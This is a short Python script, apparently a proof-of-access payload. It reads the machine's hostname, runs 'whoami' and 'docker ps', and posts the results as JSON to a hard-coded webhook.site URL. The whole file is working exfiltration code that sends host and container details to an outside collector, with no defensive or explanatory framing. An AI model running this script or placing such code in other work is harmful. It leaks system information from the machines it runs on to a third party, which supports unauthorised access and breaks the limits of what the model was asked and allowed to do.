import subprocess
import requests

WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def prove_access():
    try:
 
        with open("/etc/hostname", "r") as f:
            hostname = f.read().strip()
            
 
        user = subprocess.check_output(["whoami"]).decode().strip()
        
 
        docker_output = subprocess.check_output(["docker", "ps"], stderr=subprocess.STDOUT).decode().strip()
        
        data = {
            "proof_hostname": hostname,
            "proof_user": user,
            "docker_status": "Accessible",
            "docker_ps_output": docker_output
        }
        
        requests.post(WEBHOOK_URL, json=data)
        print("Proof sent to webhook.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    prove_access()
